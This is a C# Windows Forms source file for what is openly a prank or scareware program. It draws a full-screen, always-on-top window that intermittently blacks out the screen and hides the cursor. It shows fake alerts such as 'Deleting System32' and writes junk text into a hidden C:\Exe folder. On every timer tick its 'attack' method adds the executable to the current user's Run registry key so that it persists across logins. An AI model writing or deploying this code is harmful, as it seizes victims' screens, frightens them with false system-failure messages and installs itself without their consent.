using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Diagnostics;

namespace VSample
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            this.TransparencyKey = this.BackColor;
            this.TopMost = true;
        }

        Timer t;
        Random r;
        StreamWriter sw;

        string[] errorsMsg = { "Deleting System32", "fatal Error", "System Crashing", "OS shutdown" };
        string[] fatals = {"QWCECBWEVB$%^&**litttttttTTTTTTTTSCDSD_ACS7","@@@(d@&xwxbnnD23923C'.C2;CD-=S]DVS;","%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%WECWECWEUCVWECVlllllllllllllllllllllll00000001111111111111124124","@@@@@@@@pPLCPDCLWECW[EWEW]ECWE=CV,.F,MVR749842R32","daNGERRRRRRRRRRRRRRRRRRRRRRRRRRRRR%%%%%%%@0007777777","syyyyyyyyyyyyYYYYYYYYYYYYYYYYSSSSSSSSSSSSSTTTTTTTTTTTTTTTTTTEEEEEEEEMMMMMMMMMMMMMMMM%%%%%%FFFFFFFFFFFFFFFFAAAAAIIIIIILUUURRRRRRRRRREEEEEEEEEEEEEEEE","lllllllllllllllaoOOOOOOOOOOOOSOOOOOO6##########$%^6D776A687af,.<<XH","VVVVVVVVVVVVVVWOIoooooooooooo29137473w::::::::::::::Axoiqwihoi!@!@!CRASHEDDDDDDDDDDDDDDDDDDD!!!"};
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Left = 0;
            this.Top = 0;

            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Height;

            t = new Timer();
            r = new Random();

            t.Interval = 1000;

            t.Tick += attack;

            t.Start();
        }

        private void attack(object sender, EventArgs e)
        {
            ////auto run attack on PC
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Ulder", Application.ExecutablePath.ToString());

            //RemoveOwnedForm auto attack
            //Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //key.DeleteValue("Ulder", false);

            int generateNumber = r.Next(3);
            t.Interval = r.Next(1000, 2000);
            if (generateNumber == 1 || generateNumber == 2 || generateNumber == 3)
            {
                this.BackColor = Color.Black;
                Cursor.Hide();
            }
            else
            {
                this.BackColor = this.TransparencyKey;
            }

            switch (generateNumber)
            {
                case 1:
                    MessageBox.Show(errorsMsg[r.Next(errorsMsg.Length)]);
                    break;
            }
          var dir =  Directory.CreateDirectory(@"C:\Exe");

            sw = new StreamWriter(@"C:\Exe\exe.txt");
            dir.Attributes = FileAttributes.Hidden;

            for (int i = 0; i < 100; i++)
            {
                sw.WriteLine(fatals[4] + r.Next());
                sw.WriteLine(fatals[1] + r.Next());
                sw.WriteLine(DateTime.Now.ToString() + r.Next());
                sw.WriteLine(fatals[2] + r.Next());
                sw.WriteLine(fatals[0] + r.Next());
                sw.WriteLine("%%%%%%%%%%QXBWVGVAJXsdhcbdhcbskchbkd" + r.Next().ToString());
                sw.WriteLine(fatals[3] + r.Next());
                sw.WriteLine(fatals[5] + r.Next());
            }
            sw.WriteLine(fatals[6] + r.Next());
            sw.Close();

        }


    }

}